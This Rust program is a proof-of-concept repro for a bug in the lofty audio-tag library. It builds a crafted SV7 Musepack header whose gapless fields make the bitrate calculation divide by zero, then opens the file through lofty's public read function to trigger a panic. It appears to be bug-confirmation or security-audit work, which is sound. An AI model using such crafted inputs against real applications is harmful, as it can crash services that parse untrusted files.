// End-to-end repro: a minimal, from-scratch SV7 Musepack ("MP+") stream on disk whose header
// declares `frame_count = 1`, `true_gapless = 1`, and `last_frame_length = 0`.
//
// The file is read back with lofty's real public entry point, `lofty::read_from_path`, which
// drives the actual `MpcFile`/`MpcSv7Properties::read` parsing path - the same path any caller
// opening an untrusted `.mpc` file goes through. This is the "malformed file handed to a
// parser's real public entry point" case from CONFIRMATION.md section 11: the crafted bytes on
// disk ARE the genuine external input, there is no second participant to fake here.
//
// `lofty/src/musepack/sv7/properties.rs`'s `MpcSv7Properties::read` computes, for the
// `true_gapless` branch:
//     total_samples = (frame_count as u64 * MPC_FRAME_LENGTH) - (MPC_FRAME_LENGTH - last_frame_length as u64)
// and then:
//     average_bitrate = (stream_length * 8 * sample_freq) / (total_samples * 1000)
// With `frame_count == 1` and `last_frame_length == 0`, `total_samples` is exactly
// `1 * 1152 - (1152 - 0) == 0`, and the second division is an unconditional integer
// divide-by-zero, which always panics in Rust regardless of build profile (unlike the checked
// arithmetic that debug builds add elsewhere).

use lofty::file::AudioFile;

use std::io::Write;

fn build_mpc_sv7() -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(b"MP+");
    out.push(0x07); // version byte, low nibble = 7 (SV7)

    out.extend_from_slice(&1u32.to_le_bytes()); // Section 1: frame_count = 1

    out.extend_from_slice(&0u32.to_le_bytes()); // Section 2: sample_freq_index = 0 -> 44100 Hz

    out.extend_from_slice(&0u16.to_le_bytes()); // Section 3: title_peak
    out.extend_from_slice(&0u16.to_le_bytes()); //            title_gain
    out.extend_from_slice(&0u16.to_le_bytes()); // Section 4: album_peak
    out.extend_from_slice(&0u16.to_le_bytes()); //            album_gain

    // Section 5: true_gapless (bit 31) = 1, last_frame_length (bits 20..=30) = 0
    out.extend_from_slice(&0x8000_0000u32.to_le_bytes());

    out.push(0); // Section 6: encoder_version

    // Padding so the file isn't implausibly tiny for the surrounding ID3v2/ID3v1/APE tag search
    // code that runs before the SV7 property parser is reached.
    out.extend_from_slice(&[0u8; 64]);

    out
}

fn main() {
    let bytes = build_mpc_sv7();

    let path = std::env::temp_dir().join("musepack_sv7_gapless_bitrate_divzero_repro.mpc");
    {
        let mut f = std::fs::File::create(&path).expect("create mpc file");
        f.write_all(&bytes).expect("write mpc bytes");
    }

    println!(
        "wrote {} byte crafted SV7 Musepack file to {}",
        bytes.len(),
        path.display()
    );
    println!("reading it back through lofty::read_from_path (real public entry point)...");

    let tagged_file = lofty::read_from_path(&path).expect("read crafted mpc back from disk");
    let properties = tagged_file.properties();

    // Only reached if the divide-by-zero did NOT panic (i.e. the bug is fixed).
    println!(
        "RESULT: no panic. properties = duration={:?} audio_bitrate={:?}",
        properties.duration(),
        properties.audio_bitrate()
    );
}
